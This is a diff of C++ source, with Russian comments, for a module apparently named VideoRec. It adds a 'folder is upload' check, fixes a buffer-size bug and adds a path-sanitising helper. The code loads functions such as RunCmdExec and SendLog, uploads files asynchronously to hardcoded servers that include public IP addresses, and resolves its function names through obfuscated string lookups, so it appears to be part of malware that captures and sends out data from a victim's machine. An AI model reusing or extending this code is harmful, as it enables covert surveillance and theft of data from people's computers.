@@ -45,8 +45,10 @@ namespace VIDEORECDEBUGSTRINGS
 
 //	char VIDEO_REC_HOST1[] = "127.0.0.1";
 //	char VIDEO_REC_HOST2[] = "127.0.0.1";
-	char VIDEO_REC_HOST1[] = "192.168.0.100";
-	char VIDEO_REC_HOST2[] = "192.168.0.100";
+	char VIDEO_REC_HOST1[] = "192.168.0.101";
+	char VIDEO_REC_HOST2[] = "192.168.0.101";
+//	char VIDEO_REC_HOST1[] = "178.162.179.65";
+//	char VIDEO_REC_HOST2[] = "178.162.179.65";
 //	char VIDEO_REC_HOST1[] = "192.168.147.2";
 //	char VIDEO_REC_HOST2[] = "193.106.161.242";
 #else
@@ -105,6 +107,7 @@ void TVideoRecDLL::InitializeApi()
 	LoadFunc(VideoRecFuncIsSendedAsync,	(LPVOID&)IsSendedAsync);
 	LoadFunc(VideoRecFuncRunCmdExec,	(LPVOID&)RunCmdExec);
 	LoadFunc(VideoRecFuncSendLog,		(LPVOID&)SendLog);
+	LoadFunc(VideoRecFuncFolderIsUpload,(LPVOID&)FolderIsUpload);
 }
 
 //*********************************************************************************
@@ -382,16 +385,26 @@ static void WINAPI HandlerSendFiles( LPVOID Data, PPipeMessage Message, bool &Ca
 {
 	if( Message->DataSize != sizeof(MsgSendFiles) ) return;
 	MsgSendFiles* msg = (MsgSendFiles*)Message->Data;
-	VDRDBG( "Video", "Start send files %s", msg->path );
+	VDRDBG( "Video", "Start send files %s, %s", msg->name, msg->path );
 	if( dll )
 		msg->id = dll->StartSendAsync( servers[msg->numServer], msg->name, msg->path, msg->after );
+}
+
+//проверка на наличие данной закачки
+static void WINAPI HandlerFolderIsUpload( LPVOID Data, PPipeMessage Message, bool &Cancel )
+{
+	if( Message->DataSize != sizeof(MsgSendFiles) ) return;
+	MsgSendFiles* msg = (MsgSendFiles*)Message->Data;
+	VDRDBG( "Video", "FolderIsUpload: name: %s, folder: %s", msg->name, msg->path );
+	if( dll )
+		msg->id = dll->FolderIsUpload( msg->name, msg->path );
 }
 
 DWORD SendFiles( int server, const char* name, const char* path, int after, bool async )
 {
 	MsgSendFiles msg;
 	SafeCopyStr( msg.name, sizeof(msg.name), name );
-	SafeCopyStr( msg.path, sizeof(msg.name), path );
+	SafeCopyStr( msg.path, sizeof(msg.path), path );
 	msg.numServer = server;
 	msg.after = after;
 	char buf[64];
@@ -405,6 +418,17 @@ DWORD SendFiles( int server, const char* name, const char* path, int after, bool
 	return 0;
 }
 
+bool FolderIsUpload( const char* name, const char* folder )
+{
+	MsgSendFiles msg;
+	SafeCopyStr( msg.name, sizeof(msg.name), name );
+	SafeCopyStr( msg.path, sizeof(msg.path), folder );
+	char buf[64];
+	PIPE::SendMessage( VideoProcess::GetNamePipe(buf), GetStr(VideoRecFuncFolderIsUpload).t_str(), (char*)&msg, sizeof(msg), &msg );
+	if( msg.id )
+		return true;
+	return false;
+}
 //////////////////////////////////////////////////////////////////
 //проверка окончания передачи файлов
 struct MsgFilesIsSended
@@ -694,6 +718,7 @@ bool Start()
 
 			PIPE::RegisterMessageHandler( pipe, HandlerSendFiles, 0, GetStr(VideoRecFuncSendFilesAsync).t_str(), 0 );
 			PIPE::RegisterMessageHandler( pipe, HandlerFilesIsSended, 0, GetStr(VideoRecFuncIsSendedAsync).t_str(), 0 );
+			PIPE::RegisterMessageHandler( pipe, HandlerFolderIsUpload, 0, GetStr(VideoRecFuncFolderIsUpload).t_str(), 0 );
 
 			PIPE::RegisterMessageHandler( pipe, HandlerSendLog, 0, GetStr(VideoRecFuncSendLog).t_str(), 0 );
 
@@ -720,4 +745,22 @@ char* GetNamePipe( char* buf )
 	return buf;
 }
 
+}
+
+char* PathToName( const char* path, char* name, int szName )
+{
+	const char* bad = "\\/:'\" "; //символы которые заменяем на _
+	const char* p = path;
+	char* n = name;
+	int i = 0;
+	while( *p && i < szName - 1 )
+	{
+		if( STR::Scan( bad, *p ) )
+			*n = '_';
+		else
+			*n = *p;
+		p++; n++; i++;
+	}
+	*n = 0;
+	return name;
 }
